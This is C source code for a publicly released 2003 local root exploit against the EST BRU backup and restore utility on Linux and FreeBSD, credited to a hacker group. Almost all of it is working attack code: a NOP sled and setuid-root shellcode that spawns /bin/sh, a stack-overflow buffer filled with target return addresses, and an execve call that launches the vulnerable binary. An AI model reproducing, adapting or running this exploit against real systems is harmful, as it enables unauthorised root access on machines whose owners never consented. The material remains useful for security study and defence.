/** EST BRU(TM) Backup and Restore Utility Local Root Exploit
 **
 ** By: Dvdman@l33tsecurity.com
 **
 ** Simple Stack overflow Wont say any more :P
 **
 ** Linux & FreeBsd Targets
 **
 ** Greetz: sam,flatline,v0id,#!l33tsecurity@efnet,KF,b0iler,schlumpf,kokanin,DSR
 **
 ** Public Release
 ** L33tsecurity 2003; irc.secsup.org #l33tsecurity
 **/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/errno.h>

#define FUN "./bru"

char shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

    /* SETUID(0) SHELLCODE LINUX */
    "\xfc\xfc\xfc\xfc\xfc\xfc\xfc\xfc\xfc\xfc\xfc\xfc"
    "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f"
    "\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d"
    "\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";

unsigned long sp(void) {
           __asm__("movl %esp,%eax");
}

int main(int argc, char **argv) {

    char buffer[9000];
    int x,target;  
    char    *env[2];
    char    *args[24];

    unsigned long ret = 0xbffffffa - strlen(shellcode) - strlen(FUN); 

    int *ptr = (int *)(buffer);
    if (argc != 2) {
       usage();
       exit(0);
       }
        
    target = atoi(argv[1]);

   if (target == 0) {
    for (x=0; x<9000 ; x+=4)
      *ptr++ = (ret + 1);
   }

   if (target == 1) {
     for (x=0; x<3500 ; x+=4)
          *ptr++ = 0xbfbffe48;
   }
    
    /* put in env */  
    env[0] = shellcode;     
    env[1] = NULL;


    args[0] = FUN;
    args[1] = buffer;
    args[2] = NULL;


    execve (args[0], args, env);
    perror ("execve");        
}       


int usage() {
printf("EST BRU(TM)local root exploit\n");
printf("By: Dvdman@l33tsecurity.com\n");
printf("Usage: ./ex_bru target\n");
printf("TARGET LIST:\n");
printf("0. LINUX\n1. FREEBSD\n");
return 0;
}
